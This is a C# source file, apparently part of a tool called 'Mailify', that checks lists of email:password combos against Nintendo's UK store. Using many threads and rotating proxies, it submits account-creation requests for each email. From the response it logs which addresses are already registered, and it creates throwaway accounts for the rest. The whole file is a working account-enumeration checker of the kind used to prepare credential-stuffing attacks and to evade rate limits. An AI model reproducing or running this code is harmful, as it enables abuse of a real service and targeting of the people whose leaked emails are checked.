using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Nintendo_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    req.AddHeader("origin", "https://store.nintendo.co.uk");
                    req.AddHeader("referer", "https://store.nintendo.co.uk/accountCreate.account?returnTo=https%3A%2F%2Fstore.nintendo.co.uk%2FaccountHome.account");
                    req.AddHeader("sec-fetch-dest", "document");
                    req.AddHeader("sec-fetch-mode", "navigate");
                    req.AddHeader("sec-fetch-site", "same-origin");
                    req.AddHeader("sec-fetch-user", "?1");
                    req.AddHeader("sec-gpc", "1");
                    req.AddHeader("upgrade-insecure-requests", "1");
                    req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");

                    var res0 = req.Get("https://store.nintendo.co.uk/");
                    string text0 = res0.ToString();

                    var csrf = req.Cookies.GetCookies("https://store.nintendo.co.uk/")["csrf_token"].Value;
                    var post = WebUtility.UrlDecode("customerName=jack&customerEmail=" + credentials[0] + "&confirmCustomerEmail=" + credentials[0] + "&customerPassword=a1m2i3ne&confirmPassword=a1m2i3ne&_optOutNewsLetter=on&returnTo=https://store.nintendo.co.uk/accountHome.account&isLinkingAccounts=&csrfToken=" + csrf + "&accountLinkingCsrfToken=");
                    req.AddHeader("origin", "https://store.nintendo.co.uk");
                    req.AddHeader("referer", "https://store.nintendo.co.uk/accountCreate.account?returnTo=https%3A%2F%2Fstore.nintendo.co.uk%2FaccountHome.account");
                    req.AddHeader("sec-fetch-dest", "document");
                    req.AddHeader("sec-fetch-mode", "navigate");
                    req.AddHeader("sec-fetch-site", "same-origin");
                    req.AddHeader("sec-fetch-user", "?1");
                    req.AddHeader("sec-gpc", "1");
                    req.AddHeader("upgrade-insecure-requests", "1");
                    req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");

                    var res1 = req.Post("https://store.nintendo.co.uk/accountCreate.account", post, "application/x-www-form-urlencoded");
                    string text1 = res1.ToString();

                    if (text1.Contains("This E-mail address is already registered"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text1.Contains("Your Account") || text1.Contains("Welcome jack"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }


                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}